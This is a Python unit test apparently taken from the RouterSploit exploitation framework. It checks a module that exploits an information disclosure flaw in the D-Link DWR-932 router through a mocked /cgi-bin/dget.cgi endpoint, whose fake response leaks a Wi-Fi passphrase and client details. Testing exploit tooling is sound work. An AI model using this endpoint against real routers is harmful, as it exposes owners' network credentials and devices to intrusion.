from routersploit.modules.exploits.routers.dlink.dwr_932_info_disclosure import Exploit


def test_exploit_success(target):
    """ Test scenario - successful exploitation """

    route_mock = target.get_route_mock("/cgi-bin/dget.cgi", methods=["GET"])
    route_mock.return_value = (
        '{ "wifi_AP1_ssid": "dlink-DWR-932", "wifi_AP1_hidden": "0", "wifi_AP1_passphrase": "MyPaSsPhRaSe", "wifi_AP1_passphrase_wep": "", "wifi_AP1_security_mode": "3208,8", "wifi_AP1_enable": "1", "get_mac_filter_list": "", "get_mac_filter_switch": "0", "get_client_list": "9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0", "get_mac_address": "c4:00:f5:00:ec:40", "get_wps_dev_pin": "", "get_wps_mode": "0", "get_wps_enable": "0", "get_wps_current_time": "" }'
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
